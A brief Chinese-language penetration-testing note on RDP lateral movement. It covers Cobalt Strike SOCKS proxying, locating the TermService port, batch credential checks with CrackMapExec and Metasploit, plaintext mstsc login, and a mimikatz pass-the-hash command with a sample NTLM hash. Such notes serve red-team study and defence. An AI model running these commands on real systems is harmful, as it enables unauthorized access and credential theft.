远程桌面服务 支持明文账号密码及 HASH 连接。
3389开放，且CS获取了明文密码。

直接CS做socks代理转发，在本地远程登录。

>Windows默认同时只能登录一个账号,另一个下线。
Windows Server版，支持远程桌面多用户登陆。远程登录成功时，已有登录的主机上会有提示信息，且可显示多个用户在线（任务管理器-用户）。linux支持远程多用户登录。

^
1.探针服务：
cs 内置端口扫描 3389
tasklist /svc | find "TermService" # 找到对应服务进程的 PID
netstat -ano | find "PID 值" # 找到进程对应的端口号



2.探针连接：
CrackMapExec\&MSF 批扫用户名密码验证


3.连接执行：
明文连接：
mstsc远程连接程序
```
mstsc /console /v:192.168.3.32 /admin
```

HASH 连接：
使用RDP的hash值连接桌面，可能比较麻烦，这里提前条件太多了，需要开启Restricted Admin Mode，在Windows8.1和Windows server 2012 r2上是默认开启的。
```
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:administrator /domain:192.168.20.1 /ntlm:579da618cfbfa85247acf1f800a280a4 "/run:mstsc.exe /restrictedadmin"
```


